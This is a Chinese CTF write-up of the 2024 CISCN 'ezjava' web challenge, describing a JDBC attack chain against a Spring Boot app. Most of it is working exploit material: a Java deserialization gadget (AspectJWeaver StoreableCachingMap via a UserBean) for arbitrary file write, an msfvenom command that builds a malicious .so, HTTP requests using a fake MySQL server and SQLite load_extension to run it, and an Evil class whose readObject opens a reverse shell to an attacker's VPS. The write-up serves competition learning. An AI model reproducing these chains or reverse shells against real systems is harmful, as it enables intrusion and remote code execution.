---
title: 2024CISCN_WEB_ezjava题解
date: 2024-06-01 18:53:00 +0800
img_path: /
categories: [CTF, CTF比赛记录]
tags: [CTF, CTF比赛记录]   

---



# 2024CISCN_WEB_ezjava题解

## 一、题目分析

访问可看到`JDBC`连接的界面，大概知道应该考察的是`JDBCAttack`

![image-20240601193237928](assets/image-20240601193237928.png)

反编译`jar`包可看到，这里`url`可控存在明显的利用点。

![image-20240601193457261](assets/image-20240601193457261.png)

`pom.xml`中看到`AspectJWeaver`，网上查到存在一个任意文件写的链，但是是依赖`CC`的。

![image-20240601193606087](assets/image-20240601193606087.png)

后面发现`Jar`包中自带了个`UserBean`并且实现了`Serializable`

![image-20240601194016489](assets/image-20240601194016489.png)

在`readObject`中可以看到调用的`a.put`并且`name`和`age`以及`a`都是可控的，所以不用`CC`也可以实现任意文件写。

```java
package org.example.JDBC;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

import java.util.Base64;
import java.util.HashMap;

public class AspectJWeaverSer {

    public static void main(String[] args) throws Exception {
        Constructor con = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructor(String.class, int.class);
        con.setAccessible(true);
        // 实例化对象
        HashMap map = (HashMap) con.newInstance("/tmp/", 1); //这里写文件路径（必须是存在的路径）
        Constructor constructor = Class.forName("com.example.jdbctest.bean.UserBean").getDeclaredConstructor();
        constructor.setAccessible(true);
        Object userBean = constructor.newInstance();
        Class cls = userBean.getClass();
        Field field = cls.getDeclaredField("obj");
        field.setAccessible(true);
        field.set(userBean, map);
        Field field1 = cls.getDeclaredField("name");
        field1.setAccessible(true);
        field1.set(userBean, "xxx.xxx"); //这里写文件名
        Field field2 = cls.getDeclaredField("age");
        field2.setAccessible(true);
        String payload = "";  //这里写base64编码后的文件内容
        field2.set(userBean, payload);
        byte[] bytes = serialize(userBean);
        System.out.println(new String(Base64.getEncoder().encode(bytes)));
        Object o = deserialize(bytes);
    }

    public static byte[] serialize(final Object obj) throws Exception {
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    }

    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
}
```

到这里以及完成了任意文件写，但是回到了一个经常被问到的问题：`SpringBoot`项目任意文件写如何才能RCE？

这里其实网上存在的一些方法比如覆盖`$JAVA_HOME/jre/lib/`路径下的`jar`包再去触发特定的方法，或者是往`$JAVA_HOME/jre/classes`写一个恶意类再去加载它（但是`classes`这个目录默认是没有的，就这个题而言是无法创建这个目录的，因为无法往不存在的路径写内容）。

在比赛时，尝试去利用但是条件都太局限了，最终也是没能实现（笔者太菜了），以为出题人想要考察`SpringBoot`项目任意文件写RCE，所以思维被局限在任意文件写`RCE`里了。

其实赛后看到大佬们的打法，才发现还有写一个恶意的`.so`文件然后通过`Sqlite`去加载`.so`文件的方法，还是对这方面了解的少太菜了  /(ㄒoㄒ)/~~。

## 二、题目复现

先生成个恶意的`.so`，

```bash
msfvenom -p linux/x64/exec CMD='echo YmFzaCAtaSA+JiAvxxxxxxxxxxx |base64 -d|bash' -f elf-so -o evil.so
```

![image-20240601203258833](assets/image-20240601203258833.png)



![image-20240601203508662](assets/image-20240601203508662.png)

fakeServer：`fake-mysql-gui-0.0.4.jar`

![image-20240601203944606](assets/image-20240601203944606.png)

写入恶意`.so`：

```http
POST /jdbc/connect HTTP/1.1
Host: ip:port
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 78

{"type":"1","url":"jdbc:mysql://ip:port/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=base64ZGVzZXJfQ1VTVE9N"}
```

触发恶意`.so`:

```http
POST /jdbc/connect HTTP/1.1
Host: ip:port
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Length: 78

{"type":"3","tableName":"(select (load_extension(\"/tmp/evil.so\")));","url":"jdbc:sqlite:file:/tmp/db?enable_load_extension=true"}
```

![image-20240601203900568](assets/image-20240601203900568.png)

## 三、题外思考

在本地搭建环境调试和查资料的时候，发现假设可以往`$JAVA_HOME/jre/classes`里写内容，其实可以写一个恶意类比如`Evil.class`。

```java
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class Evil implements Serializable {
    private void readObject(ObjectInputStream ois){
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/vps/9001 0>&1").redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {

        }
        try {
            Runtime.getRuntime().exec("notepad");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}

```

我们可以在任意地方，通过反射获取这个类并且可以实例化。

```java
package org.example.JDBC;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class EvilCaller {
    public static void main(String[] args) {
        try {
            Class<?> evilClass = Class.forName("Evil");
            Object evilInstance = evilClass.getDeclaredConstructor().newInstance();
            ByteArrayOutputStream btout = new ByteArrayOutputStream();
            ObjectOutputStream objOut = new ObjectOutputStream(btout);
            objOut.writeObject(evilInstance);
            System.out.println(new String(Base64.getEncoder().encode(btout.toByteArray())));
            //deserialize(btout.toByteArray());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static Object deserialize(final byte[] serialized) throws Exception {
        ByteArrayInputStream btin = new ByteArrayInputStream(serialized);
        ObjectInputStream objIn = new ObjectInputStream(btin);
        return objIn.readObject();
    }
}
```

那么可以往`$JAVA_HOME/jre/classes`写一个恶意类并且实现`Serializable`并重写它的`readObject`。

然后在`FakeServer`写入恶意类`Evil`序列化后的`Base64`编码，当再次触发时就可以实现`任意代码执行`。

